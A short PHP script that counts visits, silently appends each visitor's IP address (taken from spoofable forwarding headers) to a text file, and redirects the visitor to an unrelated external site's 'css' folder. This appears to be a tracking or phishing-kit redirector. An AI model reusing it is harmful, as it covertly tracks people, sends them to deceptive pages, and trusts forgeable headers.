<?php
    // Obtendo número de visitas
    $txt = "contador.txt";
    $arquivo = fopen($txt,"r");
    $visitas   = fgets($arquivo,1024);
    fclose($arquivo);

    // Atualizando número de visitas
    $arquivo = fopen($txt,"r+");
    $visitas = $visitas + 1;
    fwrite($arquivo,$visitas);
    fclose($arquivo);



function get_real_ip()
    {
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
        {
            return $_SERVER["HTTP_X_FORWARDED"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED"]))
        {
            return $_SERVER["HTTP_FORWARDED"];
        }
        else
        {
            return $_SERVER["REMOTE_ADDR"];
        }
 
    }
    
$ip = get_real_ip();
$guardame = fopen('ip.txt','a+');
fwrite($guardame,"IP:".$ip."\n");

fclose($guardame);
header("Location: http://www.tech-spiel.ch/css/css/");
   
?>